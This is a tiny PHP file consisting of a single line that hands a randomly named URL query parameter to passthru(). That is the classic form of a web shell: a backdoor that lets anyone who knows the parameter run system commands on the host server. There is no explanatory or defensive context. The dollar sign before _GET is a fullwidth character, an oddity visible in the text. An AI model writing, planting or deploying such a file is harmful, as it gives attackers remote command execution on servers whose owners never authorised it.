<?php
passthru(＄_GET['eG3sMqXE']);
?>
